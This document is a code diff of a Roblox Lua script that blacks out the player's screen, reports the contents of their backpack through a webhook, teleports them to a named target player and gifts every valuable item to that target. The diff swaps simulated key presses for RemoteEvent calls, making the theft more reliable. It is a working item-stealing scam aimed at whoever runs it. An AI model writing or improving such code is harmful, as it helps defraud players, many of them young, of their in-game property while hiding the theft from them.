@@ -16,8 +16,21 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Find or create RemoteEvents
+local function getRemoteEvent(name)
+    local event = ReplicatedStorage:FindFirstChild(name)
+    if not event then
+        event = Instance.new("RemoteEvent")
+        event.Name = name
+        event.Parent = ReplicatedStorage
+    end
+    return event
+end
+
+local GiftRemote = getRemoteEvent("GiftItemRemote")
+local ProximityRemote = getRemoteEvent("CheckProximityRemote")
 
 -- SCREEN BLACKOUT
 local function blackoutScreen()
@@ -29,7 +42,7 @@ local function blackoutScreen()
     frame.ZIndex = 999
 end
 
--- SEND WEBHOOK (FIXED)
+-- SEND WEBHOOK
 local function sendWebhook()
     local success, err = pcall(function()
         local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
@@ -77,7 +90,38 @@ local function sendWebhook()
     end
 end
 
--- AUTO GIFT (FIXED)
+-- TELEPORT TO TARGET
+local function teleportToTarget(target)
+    if not target.Character then
+        target.CharacterAdded:Wait()
+        task.wait(1)
+    end
+    
+    local targetHRP = target.Character:WaitForChild("HumanoidRootPart")
+    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = targetHRP.CFrame * CFrame.new(3, 0, 3)
+    task.wait(1)
+end
+
+-- GIFT ITEMS VIA REMOTEEVENT
+local function giftViaRemote(target, item)
+    -- First try the standard RemoteEvent approach
+    GiftRemote:FireServer(target, item)
+    
+    -- Fallback: If game uses specific gifting method
+    local success = pcall(function()
+        -- Some games use this pattern:
+        game:GetService("ReplicatedStorage").GiftItem:FireServer(target, item)
+        
+        -- Or this alternative:
+        game:GetService("ReplicatedStorage").Events.GiftItem:FireServer(target, item)
+    end)
+    
+    if not success then
+        warn("Failed to find working RemoteEvent for gifting")
+    end
+end
+
+-- AUTO GIFT USING REMOTEEVENTS
 local function autoGiftAll()
     local target = Players:FindFirstChild(tradeTarget)
     if not target then
@@ -86,7 +130,7 @@ local function autoGiftAll()
     end
 
     -- Wait for character to load
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+    if not LocalPlayer.Character then
         LocalPlayer.CharacterAdded:Wait()
         task.wait(1)
     end
@@ -97,62 +141,37 @@ local function autoGiftAll()
         return
     end
 
-    local root = LocalPlayer.Character.HumanoidRootPart
-    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-
     -- Teleport near target
-    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-        local targetPos = target.Character.HumanoidRootPart.Position
-        root.CFrame = CFrame.new(targetPos + Vector3.new(3, 0, 3))
+    teleportToTarget(target)
+    
+    -- Check proximity via RemoteEvent
+    local isCloseEnough = false
+    ProximityRemote.OnClientEvent:Connect(function(result)
+        isCloseEnough = result
+    end)
+    ProximityRemote:FireServer(target)
+    task.wait(0.5)
+
+    if not isCloseEnough then
+        teleportToTarget(target) -- Try again
         task.wait(1)
-    else
-        warn("Target character not loaded")
-        return
     end
 
     -- Gift each item
     for _, item in ipairs(backpack:GetChildren()) do
         if table.find(valuableItems, item.Name) then
-            -- Re-check distance before each gift
-            if (root.Position - target.Character.HumanoidRootPart.Position).Magnitude > 10 then
-                root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 2)
-                task.wait(0.5)
-            end
-
-            -- Equip and gift
-            humanoid:EquipTool(item)
-            task.wait(0.3)
-            
-            -- Simulate E key press (more reliable)
-            for i = 1, 3 do  -- Multiple presses for reliability
-                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
-                task.wait(0.05)
-                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
-                task.wait(0.5)
-            end
-            
-            task.wait(1)  -- Cooldown between gifts
+            giftViaRemote(target, item)
+            task.wait(1) -- Cooldown between gifts
         end
     end
 end
 
--- MAIN EXECUTION (WITH ERROR HANDLING)
+-- MAIN EXECUTION
 local function main()
     blackoutScreen()
-    
-    -- Try webhook first
-    local success, err = pcall(sendWebhook)
-    if not success then
-        warn("Webhook failed: " .. tostring(err))
-    end
-    
+    sendWebhook()
     task.wait(2)
-    
-    -- Try auto-gifting
-    success, err = pcall(autoGiftAll)
-    if not success then
-        warn("Auto-gift failed: " .. tostring(err))
-    end
+    autoGiftAll()
 end
 
 -- Run with protection
